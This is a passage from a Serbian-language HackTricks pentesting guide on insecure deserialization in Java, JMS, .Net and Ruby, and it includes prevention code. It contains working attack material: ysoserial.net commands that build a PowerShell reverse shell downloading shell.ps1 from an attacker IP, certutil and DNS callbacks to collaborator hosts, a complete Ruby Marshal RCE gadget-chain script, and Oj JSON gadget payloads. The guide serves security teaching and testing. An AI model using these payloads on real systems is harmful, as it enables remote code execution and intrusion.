[**marshalsec** ](https://github.com/mbechler/marshalsec)moÅ¾e se koristiti za generisanje payload-a za eksploataciju razliÄitih **Json** i **Yml** biblioteka za serijalizaciju u Javi.\
Da bih kompajlirao projekat, morao sam da **dodam** ove **zavisnosti** u `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instalirajte maven**, i **kompajlirajte** projekat:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

ProÄitajte viÅ¡e o ovoj Java JSON biblioteci: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Ako Å¾elite da testirate neke ysoserial payload-ove moÅ¾ete **pokrenuti ovu web aplikaciju**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### ZaÅ¡to

Java koristi mnogo serijalizaciju za razliÄite svrhe kao Å¡to su:

* **HTTP zahtevi**: Serijalizacija se Å¡iroko koristi u upravljanju parametrima, ViewState-om, kolaÄiÄ‡ima itd.
* **RMI (Remote Method Invocation)**: Java RMI protokol, koji se potpuno oslanja na serijalizaciju, je kamen temeljac za daljinsku komunikaciju u Java aplikacijama.
* **RMI preko HTTP-a**: Ova metoda se obiÄno koristi od strane Java-baziranih debelih klijentskih web aplikacija, koristeÄ‡i serijalizaciju za sve komunikacije objekata.
* **JMX (Java Management Extensions)**: JMX koristi serijalizaciju za prenos objekata preko mreÅ¾e.
* **PrilagoÄ‘eni protokoli**: U Javi, standardna praksa ukljuÄuje prenos sirovih Java objekata, Å¡to Ä‡e biti prikazano u nadolazeÄ‡im primerima eksploatacije.

### Prevencija

#### Transijentni objekti

Klasa koja implementira `Serializable` moÅ¾e implementirati kao `transient` bilo koji objekat unutar klase koji ne bi trebao biti serijalizovan. Na primer:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Izbegavajte serijalizaciju klase koja treba da implementira Serializable

U scenarijima gde odreÄ‘eni **objekti moraju da implementiraju `Serializable`** interfejs zbog hijerarhije klasa, postoji rizik od nenamerne deserializacije. Da biste to spreÄili, osigurajte da ovi objekti nisu deserializabilni definiÅ¡uÄ‡i `final` `readObject()` metodu koja dosledno baca izuzetak, kao Å¡to je prikazano u nastavku:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **PoveÄ‡anje bezbednosti deserializacije u Javi**

**PrilagoÄ‘avanje `java.io.ObjectInputStream`** je praktiÄan pristup za osiguranje procesa deserializacije. Ova metoda je pogodna kada:

* Kod deserializacije je pod vaÅ¡om kontrolom.
* Klase koje se oÄekuju za deserializaciju su poznate.

Override-ujte **`resolveClass()`** metodu da ograniÄite deserializaciju samo na dozvoljene klase. Ovo spreÄava deserializaciju bilo koje klase osim onih koje su izriÄito dozvoljene, kao u sledeÄ‡em primeru koji ograniÄava deserializaciju samo na klasu `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**KoriÅ¡Ä‡enje Java agenta za poboljÅ¡anje bezbednosti** nudi reÅ¡enje kada modifikacija koda nije moguÄ‡a. Ova metoda se primenjuje uglavnom za **stavljanje na crnu listu Å¡tetnih klasa**, koristeÄ‡i JVM parametar:
```
-javaagent:name-of-agent.jar
```
Ovo pruÅ¾a naÄin za dinamiÄko obezbeÄ‘ivanje deserializacije, idealno za okruÅ¾enja gde su trenutne promene koda nepraktiÄne.

Pogledajte primer u [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementacija filtera za serijalizaciju**: Java 9 je uvela filtere za serijalizaciju putem **`ObjectInputFilter`** interfejsa, pruÅ¾ajuÄ‡i moÄ‡an mehanizam za odreÄ‘ivanje kriterijuma koje serijalizovani objekti moraju ispuniti pre nego Å¡to budu deseralizovani. Ovi filteri se mogu primeniti globalno ili po toku, nudeÄ‡i granularnu kontrolu nad procesom deserializacije.

Da biste koristili filtere za serijalizaciju, moÅ¾ete postaviti globalni filter koji se primenjuje na sve operacije deserializacije ili ga dinamiÄki konfigurisati za specifiÄne tokove. Na primer:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**KoriÅ¡Ä‡enje Eksternih Biblioteka za PoveÄ‡anu Bezbednost**: Biblioteke kao Å¡to su **NotSoSerial**, **jdeserialize** i **Kryo** nude napredne funkcije za kontrolu i praÄ‡enje Java deserializacije. Ove biblioteke mogu pruÅ¾iti dodatne slojeve bezbednosti, kao Å¡to su stavljanje na belu ili crnu listu klasa, analiziranje serijalizovanih objekata pre deserializacije i implementacija prilagoÄ‘enih strategija serijalizacije.

* **NotSoSerial** presreÄ‡e procese deserializacije kako bi spreÄio izvrÅ¡avanje nepouzdanog koda.
* **jdeserialize** omoguÄ‡ava analizu serijalizovanih Java objekata bez njihove deserializacije, pomaÅ¾uÄ‡i u identifikaciji potencijalno zlonamernog sadrÅ¾aja.
* **Kryo** je alternativni okvir za serijalizaciju koji naglaÅ¡ava brzinu i efikasnost, nudeÄ‡i konfigurisane strategije serijalizacije koje mogu poboljÅ¡ati bezbednost.

### Reference

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserialization i ysoserial razgovor: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Razgovor o gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) i slajdovi: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec rad: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java i .Net JSON deserialization **rad:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** razgovor: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserializacije CVE-ovi: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injekcija & log4Shell

PronaÄ‘ite Å¡ta je **JNDI Injekcija, kako je zloupotrebiti putem RMI, CORBA & LDAP i kako iskoristiti log4shell** (i primer ove ranjivosti) na sledeÄ‡oj stranici:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Poruka Servis

> **Java Poruka Servis** (**JMS**) API je Java middleware API orijentisan na poruke za slanje poruka izmeÄ‘u dva ili viÅ¡e klijenata. To je implementacija za reÅ¡avanje problema proizvoÄ‘aÄâ€“potroÅ¡aÄ. JMS je deo Java Platforme, Enterprise Edition (Java EE), i definisan je specifikacijom razvijenom u Sun Microsystems, ali koju je od tada vodio Java Community Process. To je standard za poruke koji omoguÄ‡ava komponentama aplikacija zasnovanim na Java EE da kreiraju, Å¡alju, primaju i Äitaju poruke. OmoguÄ‡ava komunikaciju izmeÄ‘u razliÄitih komponenti distribuirane aplikacije da bude labavo povezana, pouzdana i asinkrona. (Iz [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Proizvodi

Postoji nekoliko proizvoda koji koriste ovaj middleware za slanje poruka:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Eksploatacija

Dakle, u suÅ¡tini postoji **puno usluga koje koriste JMS na opasan naÄin**. Stoga, ako imate **dovoljno privilegija** da Å¡aljete poruke ovim uslugama (obiÄno Ä‡e vam biti potrebne vaÅ¾eÄ‡e akreditive) mogli biste biti u moguÄ‡nosti da poÅ¡aljete **zlonamerne objekte serijalizovane koji Ä‡e biti deserializovani od strane potroÅ¡aÄa/pretplatnika**.\
To znaÄi da Ä‡e u ovoj eksploataciji svi **klijenti koji Ä‡e koristiti tu poruku biti zaraÅ¾eni**.

Trebalo bi da zapamtite da Äak i ako je usluga ranjiva (jer nesigurno deserializuje korisniÄki unos) i dalje morate pronaÄ‡i vaÅ¾eÄ‡e gadgete da iskoristite ranjivost.

Alat [JMET](https://github.com/matthiaskaiser/jmet) je kreiran da **poveÅ¾e i napadne ove usluge Å¡aljuÄ‡i nekoliko zlonamernih objekata serijalizovanih koristeÄ‡i poznate gadgete**. Ove eksploatacije Ä‡e raditi ako je usluga joÅ¡ uvek ranjiva i ako je neki od koriÅ¡Ä‡enih gadgeta unutar ranjive aplikacije.

### Reference

* JMET razgovor: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slajdovi: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

U kontekstu .Net, eksploatacije deserializacije funkcioniÅ¡u na naÄin sliÄan onima u Javi, gde se gadgeti koriste za izvrÅ¡avanje specifiÄnog koda tokom deserializacije objekta.

### Otisak

#### WhiteBox

Izvorni kod treba pregledati zbog pojava:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Fokus treba biti na serijalizatorima koji omoguÄ‡avaju da se tip odredi pomoÄ‡u promenljive pod kontrolom korisnika.

#### BlackBox

Pretraga treba da bude usmerena na Base64 kodiranu string **AAEAAAD/////** ili bilo koji sliÄan obrazac koji bi mogao proÄ‡i kroz deserializaciju na serverskoj strani, dajuÄ‡i kontrolu nad tipom koji Ä‡e biti deserializovan. Ovo moÅ¾e ukljuÄivati, ali nije ograniÄeno na, **JSON** ili **XML** strukture koje sadrÅ¾e `TypeObject` ili `$type`.

### ysoserial.net

U ovom sluÄaju moÅ¾ete koristiti alat [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) kako biste **napravili eksploatacije deserializacije**. Kada preuzmete git repozitorijum, trebali biste **kompilirati alat** koristeÄ‡i Visual Studio, na primer.

Ako Å¾elite da saznate **kako ysoserial.net pravi svoju eksploataciju** moÅ¾ete [**proveriti ovu stranicu gde je objaÅ¡njen ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Glavne opcije **ysoserial.net** su: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

* **`--gadget`** se koristi za oznaÄavanje gadgeta koji Ä‡e se zloupotrebiti (oznaÄava klasu/funkciju koja Ä‡e se zloupotrebiti tokom deserializacije za izvrÅ¡avanje komandi).
* **`--formatter`**, koristi se za oznaÄavanje metode za serijalizaciju eksploatacije (morate znati koju biblioteku koristi back-end za deserializaciju payload-a i koristiti istu za serijalizaciju).
* **`--output`** se koristi za oznaÄavanje da li Å¾elite eksploataciju u **raw** ili **base64** kodiranom formatu. _Napomena da Ä‡e **ysoserial.net** **kodirati** payload koristeÄ‡i **UTF-16LE** (kodiranje koje se koristi po defaultu na Windows-u) tako da ako dobijete raw i jednostavno ga kodirate iz linux konzole mogli biste imati neke **probleme sa kompatibilnoÅ¡Ä‡u kodiranja** koji Ä‡e spreÄiti da eksploatacija funkcioniÅ¡e ispravno (u HTB JSON kutiji payload je radio u oba UTF-16LE i ASCII, ali to ne znaÄi da Ä‡e uvek raditi)._
* **`--plugin`** ysoserial.net podrÅ¾ava plugine za kreiranje **eksploatacija za specifiÄne okvire** kao Å¡to je ViewState.

#### ViÅ¡e ysoserial.net parametara

* `--minify` Ä‡e pruÅ¾iti **manji payload** (ako je moguÄ‡e)
* `--raf -f Json.Net -c "anything"` Ovo Ä‡e oznaÄiti sve gadgete koji se mogu koristiti sa datim formatter-om (`Json.Net` u ovom sluÄaju)
* `--sf xml` moÅ¾ete **oznaÄiti gadget** (`-g`) i ysoserial.net Ä‡e traÅ¾iti formatere koji sadrÅ¾e "xml" (ne razlikuje velika i mala slova)

**ysoserial primeri** za kreiranje eksploatacija:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** takoÄ‘e ima **veoma zanimljiv parametar** koji pomaÅ¾e da se bolje razume kako svaki exploit funkcioniÅ¡e: `--test`\
Ako navedete ovaj parametar, **ysoserial.net** Ä‡e **pokuÅ¡ati** da **izvrÅ¡i** **exploit lokalno,** tako da moÅ¾ete testirati da li Ä‡e vaÅ¡ payload raditi ispravno.\
Ovaj parametar je koristan jer ako pregledate kod, naÄ‡i Ä‡ete delove koda poput sledeÄ‡eg (iz [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
To znaÄi da Ä‡e kod pozvati [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) kako bi testirao eksploataciju.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
U **prethodnom kodu je ranjiv na stvoreni exploit**. Dakle, ako pronaÄ‘ete neÅ¡to sliÄno u .Net aplikaciji, to znaÄi da je verovatno i ta aplikacija ranjiva.\
Zato **`--test`** parametar omoguÄ‡ava da razumemo **koji delovi koda su ranjivi** na deserializaciju exploit koji **ysoserial.net** moÅ¾e stvoriti.

### ViewState

Pogledajte [ovaj POST o **kako pokuÅ¡ati da iskoristite \_\_ViewState parametar .Net**](exploiting-\_\_viewstate-parameter.md) da **izvrÅ¡ite proizvoljan kod.** Ako **veÄ‡ znate tajne** koje koristi Å¾rtvinska maÅ¡ina, [**proÄitajte ovaj post da znate kako da izvrÅ¡ite kod**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevencija

Da biste umanjili rizike povezane sa deserializacijom u .Net:

* **Izbegavajte dozvoljavanje podataka da definiÅ¡u svoje tipove objekata.** Koristite `DataContractSerializer` ili `XmlSerializer` kada je to moguÄ‡e.
* **Za `JSON.Net`, postavite `TypeNameHandling` na `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Izbegavajte koriÅ¡Ä‡enje `JavaScriptSerializer` sa `JavaScriptTypeResolver`.**
* **OgraniÄite tipove koji mogu biti deserializovani**, razumevajuÄ‡i inherentne rizike sa .Net tipovima, kao Å¡to je `System.IO.FileInfo`, koji moÅ¾e modifikovati svojstva server fajlova, potencijalno dovodeÄ‡i do napada uskraÄ‡ivanja usluge.
* **Budite oprezni sa tipovima koji imaju riziÄna svojstva**, poput `System.ComponentModel.DataAnnotations.ValidationException` sa svojim `Value` svojstvom, koje moÅ¾e biti iskoriÅ¡Ä‡eno.
* **Sigurno kontroliÅ¡ite instanciranje tipova** kako biste spreÄili napadaÄe da utiÄu na proces deserializacije, ÄineÄ‡i Äak i `DataContractSerializer` ili `XmlSerializer` ranjivim.
* **Implementirajte kontrole bele liste** koristeÄ‡i prilagoÄ‘eni `SerializationBinder` za `BinaryFormatter` i `JSON.Net`.
* **Budite informisani o poznatim nesigurnim deserializacijskim gadgetima** unutar .Net i osigurajte da deserializeri ne instanciraju takve tipove.
* **Izolujte potencijalno riziÄan kod** od koda sa internet pristupom kako biste izbegli izlaganje poznatim gadgetima, kao Å¡to je `System.Windows.Data.ObjectDataProvider` u WPF aplikacijama, nepouzdanim izvorima podataka.

### **Reference**

* Java i .Net JSON deserializacija **rad:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** predavanje: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

U Ruby-ju, serijalizacija se olakÅ¡ava pomoÄ‡u dve metode unutar **marshal** biblioteke. Prva metoda, poznata kao **dump**, koristi se za transformaciju objekta u bajt tok. Ovaj proces se naziva serijalizacija. Nasuprot tome, druga metoda, **load**, se koristi za vraÄ‡anje bajt toka nazad u objekat, proces poznat kao deserializacija.

Za zaÅ¡titu serijalizovanih objekata, **Ruby koristi HMAC (Hash-Based Message Authentication Code)**, osiguravajuÄ‡i integritet i autentiÄnost podataka. KljuÄ koriÅ¡Ä‡en za ovu svrhu se Äuva na jednom od nekoliko moguÄ‡ih mesta:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X generiÄka deserializacija u RCE gadget lanac (viÅ¡e informacija u** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Drugi RCE lanac za eksploataciju Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() metoda

Kao Å¡to je objaÅ¡njeno u [**ovom izveÅ¡taju o ranjivosti**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), ako neki korisniÄki nesanitizovani unos doÄ‘e do `.send()` metode ruby objekta, ova metoda omoguÄ‡ava **pozivanje bilo koje druge metode** objekta sa bilo kojim parametrima.

Na primer, pozivanje eval i zatim ruby kod kao drugi parametar Ä‡e omoguÄ‡iti izvrÅ¡avanje proizvoljnog koda:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Pored toga, ako samo jedan parametar **`.send()`** kontroliÅ¡e napadaÄ, kao Å¡to je pomenuto u prethodnom tekstu, moguÄ‡e je pozvati bilo koju metodu objekta koja **ne zahteva argumente** ili Äiji argumenti imaju **podrazumevane vrednosti**.\
Za ovo, moguÄ‡e je enumerisati sve metode objekta da bi se **pronaÅ¡le neke zanimljive metode koje ispunjavaju te zahteve**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

### Ostale biblioteke

Ova tehnika je preuzeta[ **iz ovog blog posta**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

Postoje i druge Ruby biblioteke koje se mogu koristiti za serijalizaciju objekata i koje se stoga mogu zloupotrebiti za dobijanje RCE tokom nesigurne deserializacije. SledeÄ‡a tabela prikazuje neke od ovih biblioteka i metodu koju pozivaju iz uÄitane biblioteke kada se deserializuje (funkcija koja se zloupotrebljava za dobijanje RCE):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Biblioteka</strong></td><td><strong>Ulazni podaci</strong></td><td><strong>Metoda pokretanja unutar klase</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binarnu</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (klasa mora biti stavljena u hash(mapa) kao kljuÄ)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (klasa mora biti stavljena u hash(mapa) kao kljuÄ)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (klasa mora biti stavljena u hash(mapa) kao kljuÄ)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([vidi beleÅ¡ke o json_create na kraju](#table-vulnerable-sinks))</td></tr></tbody></table>

Osnovni primer:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
U sluÄaju pokuÅ¡aja zloupotrebe Oj, bilo je moguÄ‡e pronaÄ‡i gadget klasu koja unutar svoje `hash` funkcije poziva `to_s`, koja poziva spec, koja poziva fetch\_path, Å¡to je bilo moguÄ‡e uÄiniti da preuzme nasumiÄnu URL adresu, pruÅ¾ajuÄ‡i odliÄan detektor ovih vrsta nesanitizovanih ranjivosti deserializacije.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport","path": "/", "user": "anyuser", "password": "anypw"
}
```
Pored toga, otkriveno je da se prethodnom tehnikom u sistemu takoÄ‘e kreira folder, Å¡to je zahtev za zloupotrebu drugog gadgeta kako bi se ovo pretvorilo u potpunu RCE sa neÄim poput:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Proverite viÅ¡e detalja u [**originalnom postu**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm\_source=pocket\_shared).

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
